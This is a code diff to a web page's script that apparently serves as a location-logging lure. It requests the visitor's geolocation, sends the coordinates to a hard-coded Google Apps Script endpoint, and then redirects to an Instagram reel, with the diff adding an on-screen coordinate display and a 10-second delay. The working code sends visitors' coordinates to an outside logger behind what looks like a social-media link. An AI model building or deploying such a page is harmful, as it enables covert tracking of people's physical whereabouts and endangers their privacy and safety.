@@ -35,15 +35,21 @@
           const lat = position.coords.latitude;
           const lng = position.coords.longitude;
 
-          // Send coordinates to Google Apps Script
+          // Display coordinates
+          document.getElementById("coords").textContent =
+            `Latitude: ${lat.toFixed(6)}, Longitude: ${lng.toFixed(6)}`;
+
+          // Send to Google Apps Script
           fetch("https://script.google.com/macros/s/AKfycbxnLHCxT6dKYOTaJXT6S6K_4ilUSHfhVkcvFGipQ1goxREbCLgYIIrwDSVQVlMGdhyG/exec", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ lat, lng }),
           })
           .then(() => {
-            // Redirect immediately after logging
-            window.location.href = "https://www.instagram.com/reel/DKYwX7Izaf1";
+            // ✅ Wait 10 seconds, then redirect
+            setTimeout(() => {
+              window.location.href = "https://www.instagram.com/reel/DKYwX7Izaf1";
+            }, 10000); // 10 seconds = 10000 ms
           })
           .catch(err => {
             console.error("Error logging location:", err);
@@ -51,14 +57,15 @@
           });
         },
         function () {
-          alert("Location access denied.");
+          document.getElementById("coords").textContent = "Location access denied.";
         }
       );
     } else {
-      alert("Geolocation is not supported.");
+      document.getElementById("coords").textContent = "Geolocation not supported.";
     }
   }
 </script>
+
 
 
 
